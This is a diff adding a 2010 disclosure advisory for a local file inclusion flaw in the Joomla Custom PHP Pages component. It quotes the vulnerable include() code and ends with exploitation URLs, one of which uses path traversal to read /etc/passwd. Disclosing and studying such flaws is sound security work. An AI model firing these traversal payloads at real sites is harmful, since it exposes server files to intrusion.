@@ -1,0 +1,67 @@
+
+Joomla Custom PHP Pages Component LFI Vulnerability
+=====================================================
+
+- Discovered by	: Chip D3 Bi0s
+- Email		: chipdebios@gmail.com
+- Date      	: 2010-05-11
+- Where		: From Remote
+
+----------------------------------
+Affected software description
+
+Application	: Joomla Custom PHP Pages Component 
+Developer	: Gabe
+Email		: gabe@fijiwebdesign.com
+Type		: Non-Commercial
+License		: GPL
+Date Added	: 6 June 2008
+Download	: http://joomla-php.googlecode.com/files/com_php0.1alpha1-J15.tar.gz
+
+
+I. BACKGROUND
+
+Joomla PHP Pages Component allows you to create simple PHP pages
+and link them to the Joomla Menu. This allows you to easily create
+a custom page without having to create a whole component. It is
+similar to the PHP Module for Joomla, except that it is a full Component.
+
+II. DESCRIPTION
+
+Some LFI vulnerabilities exist in Joomla Custom PHP Pages Component.
+
+
+III. ANALYSIS
+
+The bug is in the following files, specifying the lines
+
+/components/com_php/php.php
+
+[35] $filename = $Params->get('file', '');
+[36] $path = JPATH_ROOT.'/components/com_php/files/'.$filename;
+    ...
+[47] // evaluate the PHP
+[48] echo '<div class="php_page">';
+[49] if (is_file($path)) {
+[50]	include($path);
+[51] } else {
+[52]	echo '<span class="note">Please choose a File</span>';
+
+Explaining the above lines:
+According to the code that files are opened, but the code is not
+shows no filtration, so we can move into
+directories. According to several extensions can be observed as
+.html, .jpg, .js, which is not true of all .php
+
+
+
+IV. EXPLOITATION
+
+http://127.0.0.1/index.php?option=com_php&file=../images/phplogo.jpg
+http://127.0.0.1/index.php?option=com_php&file=../js/ie_pngfix.js
+http://127.0.0.1/index.php?option=com_php&file=../../../../../../../../../../etc/passwd
+
+
++++++++++++++++++++++++++++++++++++++++
+[!] Produced in South America
++++++++++++++++++++++++++++++++++++++++
